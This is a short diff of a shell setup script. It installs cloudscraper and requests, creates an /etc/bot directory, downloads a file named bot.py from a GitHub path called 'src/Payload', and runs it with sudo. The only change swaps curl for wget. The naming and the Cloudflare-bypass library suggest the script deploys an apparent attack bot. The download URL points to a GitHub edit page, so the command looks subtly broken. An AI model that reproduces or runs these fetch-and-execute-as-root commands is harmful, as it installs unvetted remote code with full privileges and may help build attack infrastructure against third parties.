@@ -3,5 +3,5 @@ pip install cloudscraper requests && pip3 install cloudscraper requests
 cd /etc
 mkdir bot
 cd /etc/bot
-curl https://github.com/oahwrd/yuhyuh/edit/main/src/Payload/bot.py
+wget https://github.com/oahwrd/yuhyuh/edit/main/src/Payload/bot.py
 sudo python3 bot.py
